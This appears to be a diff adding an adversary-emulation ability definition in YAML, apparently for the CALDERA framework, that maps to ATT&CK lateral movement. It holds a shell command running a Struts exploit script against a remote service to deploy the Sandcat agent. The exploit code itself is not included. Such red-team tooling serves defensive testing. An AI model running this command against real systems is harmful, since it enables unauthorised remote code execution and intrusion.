@@ -1,0 +1,19 @@
+---
+
+- id: b4e1f059-7408-44d5-8c38-74acc95463e5
+  name: Exploit Apache Struts
+  description: Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server
+  tactic: Lateral-Movement
+  technique:
+    attack_id: T1210
+    name: Exploitation of Remote Services
+  platforms:
+    linux:
+      sh:
+        command: |
+          python3 struts-exploit.py #{remote.service.apachestruts} #{server}
+        payload: struts-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.apachestruts_user
+          script: ''
